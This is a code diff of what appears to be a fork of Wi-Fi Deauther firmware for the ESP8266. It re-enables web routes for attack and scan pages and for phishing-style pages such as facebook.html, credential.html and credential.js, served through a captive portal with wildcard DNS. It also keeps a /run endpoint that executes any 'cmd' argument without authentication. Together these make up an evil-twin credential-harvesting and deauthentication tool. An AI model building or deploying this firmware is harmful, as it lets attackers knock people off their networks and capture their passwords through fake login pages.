@@ -27,7 +27,7 @@ extern "C" {
 
 // Important strings
 const char W_DEAUTHER[] PROGMEM =
-    "deauth.me"; // captive portal domain (alternative to 192.168.4.1)
+    "deauther"; // captive portal domain (alternative to 192.168.4.1)
 const char W_WEBINTERFACE[] PROGMEM =
     "/web"; // default folder containing the web files
 const char W_ERROR_PASSWORD[] PROGMEM =
@@ -87,13 +87,6 @@ void stopAP() {
     wifi_set_opmode(STATION_MODE);
     prntln(W_STOPPED_AP);
     wifiMode = WIFI_MODE_STATION;
-  }
-}
-
-void wifiUpdate() {
-  if ((wifiMode != WIFI_MODE_OFF) && !scan.isScanning()) {
-    server.handleClient();
-    dnsServer.processNextRequest();
   }
 }
 
@@ -170,6 +163,7 @@ bool handleFileRead(String path) {
     else if (SPIFFS.exists(wifi_config_path + path + str(W_DOT_GZIP)))
       path = wifi_config_path + path + str(W_DOT_GZIP);
     else {
+      // prntln("stream file: " + path + " error");
       return false;
     }
   }
@@ -225,6 +219,48 @@ void sendProgmem(const char *ptr, size_t size, const char *type) {
   server.send_P(200, str(type).c_str(), ptr, size);
 }
 
+void setupMdns() {
+  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
+  if (dnsServer.start(53, String(ASTERIX), apIP)) {
+    // prntln("dnsServer true");
+  } else {
+    // prntln("dnsServer false");
+  }
+
+  if (MDNS.begin(str(W_DEAUTHER).c_str())) {
+    // prntln("MDNS.begin true");
+  } else {
+    // prntln("MDNS.begin false");
+  }
+
+  if (MDNS.addService("http", "tcp", 80)) {
+    // prntln("MDNS.addService true");
+  } else {
+    // prntln("MDNS.addService false");
+  }
+
+  server.begin();
+  prnt("mDns name: ");
+  prntln(W_DEAUTHER);
+}
+
+void wifiUpdate() {
+  //&& !scan.isScanning()
+  // if ((WiFi.getMode() != W_MODE_OFF)) {
+  //   server.handleClient();
+  //   dnsServer.processNextRequest();
+  //   MDNS.update();
+  // }
+  server.handleClient();
+  dnsServer.processNextRequest();
+  if (MDNS.update()) {
+    // prntln("mdns update true");
+  } else {
+    // prntln("mdns update false");
+    // setupMdns();
+  }
+}
+
 // path = folder of web files, ssid = name of network, password = password ("0"
 // => no password), hidden = if the network is visible, captivePortal = enable a
 // captive portal
@@ -256,11 +292,6 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
     WiFi.softAP(ssid.c_str(), password.c_str(), wifi_channel, hidden);
   }
 
-  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
-  dnsServer.start(53, String(ASTERIX), apIP);
-
-  MDNS.begin(str(W_DEAUTHER).c_str());
-
   server.on(String(F("/list")).c_str(), HTTP_GET,
             handleFileList); // list directory
 
@@ -268,21 +299,30 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
   // post here the output of the webConverter.py
 #ifdef USE_PROGMEM_WEB_FILES
   if (!settings.getWebSpiffs()) {
-    // server.on(String(SLASH).c_str(), HTTP_GET,
-    //           []() { sendProgmem(indexhtml, sizeof(indexhtml), W_HTML); });
-    // server.on(String(F("/attack.html")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(attackhtml, sizeof(attackhtml), W_HTML); });
-    // server.on(String(F("/index.html")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(indexhtml, sizeof(indexhtml), W_HTML); });
-    // server.on(String(F("/info.html")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(infohtml, sizeof(infohtml), W_HTML); });
-    // server.on(String(F("/scan.html")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(scanhtml, sizeof(scanhtml), W_HTML); });
-    // server.on(String(F("/settings.html")).c_str(), HTTP_GET, []() {
-    //   sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
-    // });
+    server.on(String(SLASH).c_str(), HTTP_GET,
+              []() { sendProgmem(indexhtml, sizeof(indexhtml), W_HTML); });
+    server.on(String(F("/attack.html")).c_str(), HTTP_GET,
+              []() { sendProgmem(attackhtml, sizeof(attackhtml), W_HTML); });
+    server.on(String(F("/index.html")).c_str(), HTTP_GET,
+              []() { sendProgmem(indexhtml, sizeof(indexhtml), W_HTML); });
+    server.on(String(F("/info.html")).c_str(), HTTP_GET,
+              []() { sendProgmem(infohtml, sizeof(infohtml), W_HTML); });
+    server.on(String(F("/scan.html")).c_str(), HTTP_GET,
+              []() { sendProgmem(scanhtml, sizeof(scanhtml), W_HTML); });
+    server.on(String(F("/settings.html")).c_str(), HTTP_GET, []() {
+      sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
+    });
+
+    server.on(String(F("/captiveportal.html")).c_str(), HTTP_GET, []() {
+      sendProgmem(captiveportalhtml, sizeof(captiveportalhtml), W_HTML);
+    });
+
+    server.on(String(F("/update.html")).c_str(), HTTP_GET,
+              []() { sendProgmem(updatehtml, sizeof(updatehtml), W_HTML); });
+
     server.on(String(F("/phone.html")).c_str(), HTTP_GET,
               []() { sendProgmem(phonehtml, sizeof(phonehtml), W_HTML); });
+
     server.on(String(F("/facebook.html")).c_str(), HTTP_GET, []() {
       sendProgmem(facebookhtml, sizeof(facebookhtml), W_HTML);
     });
@@ -303,9 +343,6 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
               []() { sendProgmem(twitterpng, sizeof(twitterpng), W_PNG); });
     server.on(String(F("/images/facebook.png")).c_str(), HTTP_GET,
               []() { sendProgmem(facebookpng, sizeof(facebookpng), W_PNG); });
-    // server.on(String(F("/images/google_icon.png")).c_str(), HTTP_GET, []() {
-    //   sendProgmem(logogooglepng, sizeof(logogooglepng), W_PNG);
-    // });
 
     server.on(String(F("/css/fonts/fontawesome-webfont.svg")).c_str(), HTTP_GET,
               []() {
@@ -319,78 +356,86 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
     server.on(String(F("/images/phone.png")).c_str(), HTTP_GET,
               []() { sendProgmem(phonepng, sizeof(phonepng), W_PNG); });
 
-    // server.on(String(F("/credential.html")).c_str(), HTTP_GET, []() {
-    //   sendProgmem(credentialhtml, sizeof(credentialhtml), W_HTML);
-    // });
+    server.on(String(F("/credential.html")).c_str(), HTTP_GET, []() {
+      sendProgmem(credentialhtml, sizeof(credentialhtml), W_HTML);
+    });
 
-    // server.on(String(F("/ssids.html")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML); });
+    server.on(String(F("/ssids.html")).c_str(), HTTP_GET,
+              []() { sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML); });
 
     server.on(String(F("/style.css")).c_str(), HTTP_GET,
               []() { sendProgmem(stylecss, sizeof(stylecss), W_CSS); });
 
-    // server.on(String(F("/js/attack.js")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(attackjs, sizeof(attackjs), W_JS); });
+    server.on(String(F("/js/attack.js")).c_str(), HTTP_GET,
+              []() { sendProgmem(attackjs, sizeof(attackjs), W_JS); });
+
+    server.on(String(F("/js/update.js")).c_str(), HTTP_GET,
+              []() { sendProgmem(updatejs, sizeof(updatejs), W_JS); });
+
     server.on(String(F("/js/credential.js")).c_str(), HTTP_GET,
               []() { sendProgmem(credentialjs, sizeof(credentialjs), W_JS); });
-    // server.on(String(F("/js/scan.js")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(scanjs, sizeof(scanjs), W_JS); });
-    // server.on(String(F("/js/settings.js")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(settingsjs, sizeof(settingsjs), W_JS); });
+    server.on(String(F("/js/scan.js")).c_str(), HTTP_GET,
+              []() { sendProgmem(scanjs, sizeof(scanjs), W_JS); });
+    server.on(String(F("/js/settings.js")).c_str(), HTTP_GET,
+              []() { sendProgmem(settingsjs, sizeof(settingsjs), W_JS); });
     server.on(String(F("/js/site.js")).c_str(), HTTP_GET,
               []() { sendProgmem(sitejs, sizeof(sitejs), W_JS); });
-    // server.on(String(F("/js/ssids.js")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS); });
-    // server.on(String(F("/lang/cn.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(cnlang, sizeof(cnlang), W_JSON); });
-    // server.on(String(F("/lang/cs.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(cslang, sizeof(cslang), W_JSON); });
-    // server.on(String(F("/lang/de.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(delang, sizeof(delang), W_JSON); });
-    // server.on(String(F("/lang/en.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(enlang, sizeof(enlang), W_JSON); });
-    // server.on(String(F("/lang/es.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(eslang, sizeof(eslang), W_JSON); });
-    // server.on(String(F("/lang/fi.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(filang, sizeof(filang), W_JSON); });
-    // server.on(String(F("/lang/fr.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(frlang, sizeof(frlang), W_JSON); });
-    // server.on(String(F("/lang/it.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(itlang, sizeof(itlang), W_JSON); });
-    // server.on(String(F("/lang/ru.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(rulang, sizeof(rulang), W_JSON); });
-    // server.on(String(F("/lang/tlh.lang")).c_str(), HTTP_GET,
-    //           []() { sendProgmem(tlhlang, sizeof(tlhlang), W_JSON); });
+    server.on(String(F("/js/ssids.js")).c_str(), HTTP_GET,
+              []() { sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS); });
+    server.on(String(F("/lang/cn.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(cnlang, sizeof(cnlang), W_JSON); });
+    server.on(String(F("/lang/cs.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(cslang, sizeof(cslang), W_JSON); });
+    server.on(String(F("/lang/de.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(delang, sizeof(delang), W_JSON); });
+    server.on(String(F("/lang/en.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(enlang, sizeof(enlang), W_JSON); });
+    server.on(String(F("/lang/es.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(eslang, sizeof(eslang), W_JSON); });
+    server.on(String(F("/lang/fi.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(filang, sizeof(filang), W_JSON); });
+    server.on(String(F("/lang/fr.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(frlang, sizeof(frlang), W_JSON); });
+    server.on(String(F("/lang/it.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(itlang, sizeof(itlang), W_JSON); });
+    server.on(String(F("/lang/ru.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(rulang, sizeof(rulang), W_JSON); });
+    server.on(String(F("/lang/tlh.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(tlhlang, sizeof(tlhlang), W_JSON); });
+    server.on(String(F("/lang/vi.lang")).c_str(), HTTP_GET,
+              []() { sendProgmem(vilang, sizeof(vilang), W_JSON); });
   }
   server.on(str(W_DEFAULT_LANG).c_str(), HTTP_GET, []() {
     if (!settings.getWebSpiffs()) {
-      // if (settings.getLang() == String(F("cn")))
-      //   sendProgmem(cnlang, sizeof(cnlang), W_JSON);
-      // else if (settings.getLang() == String(F("cs")))
-      //   sendProgmem(cslang, sizeof(cslang), W_JSON);
-      // else if (settings.getLang() == String(F("de")))
-      //   sendProgmem(delang, sizeof(delang), W_JSON);
-      // else if (settings.getLang() == String(F("en")))
-      //   sendProgmem(enlang, sizeof(enlang), W_JSON);
-      // else if (settings.getLang() == String(F("es")))
-      //   sendProgmem(eslang, sizeof(eslang), W_JSON);
-      // else if (settings.getLang() == String(F("fi")))
-      //   sendProgmem(filang, sizeof(filang), W_JSON);
-      // else if (settings.getLang() == String(F("fr")))
-      //   sendProgmem(frlang, sizeof(frlang), W_JSON);
-      // else if (settings.getLang() == String(F("it")))
-      //   sendProgmem(itlang, sizeof(itlang), W_JSON);
-      // else if (settings.getLang() == String(F("ru")))
-      //   sendProgmem(rulang, sizeof(rulang), W_JSON);
-      // else if (settings.getLang() == String(F("tlh")))
-      //   sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
+      if (settings.getLang() == String(F("cn")))
+        sendProgmem(cnlang, sizeof(cnlang), W_JSON);
+      else if (settings.getLang() == String(F("cs")))
+        sendProgmem(cslang, sizeof(cslang), W_JSON);
+      else if (settings.getLang() == String(F("de")))
+        sendProgmem(delang, sizeof(delang), W_JSON);
+      else if (settings.getLang() == String(F("en")))
+        sendProgmem(enlang, sizeof(enlang), W_JSON);
+      else if (settings.getLang() == String(F("es")))
+        sendProgmem(eslang, sizeof(eslang), W_JSON);
+      else if (settings.getLang() == String(F("fi")))
+        sendProgmem(filang, sizeof(filang), W_JSON);
+      else if (settings.getLang() == String(F("fr")))
+        sendProgmem(frlang, sizeof(frlang), W_JSON);
+      else if (settings.getLang() == String(F("it")))
+        sendProgmem(itlang, sizeof(itlang), W_JSON);
+      else if (settings.getLang() == String(F("ru")))
+        sendProgmem(rulang, sizeof(rulang), W_JSON);
+      else if (settings.getLang() == String(F("tlh")))
+        sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
+      else if (settings.getLang() == String(F("vi")))
+        sendProgmem(vilang, sizeof(vilang), W_JSON);
 
-      // else
-      //   handleFileRead(String(F("/web/lang/")) + settings.getLang() +
-      //                  String(F(".lang")));
+      else
+        handleFileRead(String(F("/web/lang/")) + settings.getLang() +
+                       String(F(".lang")));
     } else {
-      // handleFileRead(String(F("/web/lang/")) + settings.getLang() +
-      //                String(F(".lang")));
+      handleFileRead(String(F("/web/lang/")) + settings.getLang() +
+                     String(F(".lang")));
     }
   });
 #endif
@@ -399,8 +444,6 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
   server.on(String(F("/run")).c_str(), HTTP_GET, []() {
     server.send(200, str(W_TXT), str(W_OK).c_str());
     String input = server.arg("cmd");
-    // prnt("input-> ");
-    // prntln(input);
     cli.exec(input); // run command from web or serial
   });
 
@@ -444,43 +487,43 @@ void startAP(String path, String ssid, String password, uint8_t ch, bool hidden,
     prntln(server.uri());
   });
 
-  server.begin();
   wifiMode = WIFI_MODE_AP;
-
+  server.begin();
+  // setupMdns();
   prntln(W_STARTED_AP);
   printWifiStatus();
 }
 
 void printWifiStatus() {
-  // prnt(String(F("[WiFi] Path: '")));
-  // prnt(wifi_config_path);
-  // prnt(String(F("', Mode: '")));
+  prnt(String(F("[WiFi] Path: '")));
+  prnt(wifi_config_path);
+  prnt(String(F("', Mode: '")));
 
-  // switch (wifiMode) {
-  // case WIFI_MODE_OFF:
-  //   prnt(W_MODE_OFF);
-  //   break;
+  switch (wifiMode) {
+  case WIFI_MODE_OFF:
+    prnt(W_MODE_OFF);
+    break;
 
-  // case WIFI_MODE_AP:
-  //   prnt(W_AP);
-  //   break;
+  case WIFI_MODE_AP:
+    prnt(W_AP);
+    break;
 
-  // case WIFI_MODE_STATION:
-  //   prnt(W_STATION);
-  //   break;
-  // }
-  // prnt(String(F("', SSID: '")));
-  // prnt(wifi_config_ssid);
-  // prnt(String(F("', password: '")));
-  // prnt(wifi_config_password);
-  // prnt(String(F("', channel: '")));
-  // prnt(wifi_channel);
-  // prnt(String(F("', hidden: ")));
-  // prnt(b2s(wifi_config_hidden));
-  // prnt(String(F(", captive-portal: ")));
-  // prntln(b2s(wifi_config_captivePortal));
-  // prnt(String(F(", set_none_password: ")));
-  // prntln(b2s(wifi_config_none_password));
+  case WIFI_MODE_STATION:
+    prnt(W_STATION);
+    break;
+  }
+  prnt(String(F("', SSID: '")));
+  prnt(wifi_config_ssid);
+  prnt(String(F("', password: '")));
+  prnt(wifi_config_password);
+  prnt(String(F("', channel: '")));
+  prnt(wifi_channel);
+  prnt(String(F("', hidden: ")));
+  prnt(b2s(wifi_config_hidden));
+  prnt(String(F(", captive-portal: ")));
+  prntln(b2s(wifi_config_captivePortal));
+  prnt(String(F(", set_none_password: ")));
+  prntln(b2s(wifi_config_none_password));
 }
 
 void startAP() {
